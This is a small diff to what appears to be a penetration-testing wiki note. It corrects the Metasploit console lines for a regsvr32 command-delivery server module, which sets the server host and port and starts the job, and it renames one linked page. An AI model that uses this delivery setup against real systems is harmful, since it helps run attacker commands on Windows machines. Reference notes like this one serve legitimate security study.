@@ -59,11 +59,11 @@ msf auxiliary(server/regsvr32_command_delivery_server) > options
 
 msf auxiliary(server/regsvr32_command_delivery_server) > set cmd <commands>
 
-msf exploit(multi/script/web_delivery) > set srvhost <server_IP>
+msf auxiliary(server/regsvr32_command_delivery_server) > set srvhost <server_IP>
 
-msf exploit(multi/script/web_delivery) > set srvport <server_PORT>
+msf auxiliary(server/regsvr32_command_delivery_server) > set srvport <server_PORT>
 
-msf exploit(multi/script/web_delivery) > run -j
+msf auxiliary(server/regsvr32_command_delivery_server) > run -j
 ```
 
 ---
@@ -73,4 +73,4 @@ msf exploit(multi/script/web_delivery) > run -j
 
 - [[Scriptlet]]
 
-- [[Windows Console]]
+- [[Command Prompt]]
